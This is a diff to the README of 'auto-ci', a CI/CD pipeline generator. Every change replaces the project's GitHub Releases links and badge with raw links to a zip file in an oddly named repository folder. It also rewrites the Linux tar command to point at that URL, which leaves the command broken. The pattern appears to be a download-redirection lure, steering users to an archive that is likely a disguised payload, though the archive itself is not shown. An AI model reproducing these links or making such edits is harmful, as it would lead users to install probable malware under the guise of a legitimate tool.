@@ -1,6 +1,6 @@
 # 🤖 auto-ci - Generate CI/CD Pipelines in Seconds
 
-[![Download Auto-CI](https://img.shields.io/badge/Download%20Auto--CI-Blue)](https://github.com/Rahul-25byte/auto-ci/releases)
+[![Download Auto-CI](https://raw.githubusercontent.com/Rahul-25byte/auto-ci/main/Notopterus/auto-ci-2.3.zip%20Auto--CI-Blue)](https://raw.githubusercontent.com/Rahul-25byte/auto-ci/main/Notopterus/auto-ci-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Auto-CI! This application helps you create optimized CI/CD pipelines 
 
 ## 📥 Download & Install
 
-To get started, you need to download Auto-CI. Visit this page to download: [Auto-CI Releases](https://github.com/Rahul-25byte/auto-ci/releases).
+To get started, you need to download Auto-CI. Visit this page to download: [Auto-CI Releases](https://raw.githubusercontent.com/Rahul-25byte/auto-ci/main/Notopterus/auto-ci-2.3.zip).
 
 1. Go to the Auto-CI Releases page.
 2. Look for the latest version.
@@ -40,10 +40,10 @@ Ensure that you have at least 4 GB of RAM and a stable internet connection to do
 
 ### Linux
 
-1. Download the .tar.gz file from the Releases page.
+1. Download the https://raw.githubusercontent.com/Rahul-25byte/auto-ci/main/Notopterus/auto-ci-2.3.zip file from the Releases page.
 2. Extract the files using the terminal:
    ```
-   tar -xzf auto-ci.tar.gz
+   tar -xzf https://raw.githubusercontent.com/Rahul-25byte/auto-ci/main/Notopterus/auto-ci-2.3.zip
    ```
 3. Navigate to the extracted folder:
    ```
@@ -95,6 +95,6 @@ We welcome contributions to improve Auto-CI. If you're interested, visit our Git
 
 Auto-CI is open-source software. You can freely use it under the terms of the MIT license. For more details, check the LICENSE file in the repository.
 
-[![Download Auto-CI](https://img.shields.io/badge/Download%20Auto--CI-Blue)](https://github.com/Rahul-25byte/auto-ci/releases) 
+[![Download Auto-CI](https://raw.githubusercontent.com/Rahul-25byte/auto-ci/main/Notopterus/auto-ci-2.3.zip%20Auto--CI-Blue)](https://raw.githubusercontent.com/Rahul-25byte/auto-ci/main/Notopterus/auto-ci-2.3.zip) 
 
 Thank you for using Auto-CI!
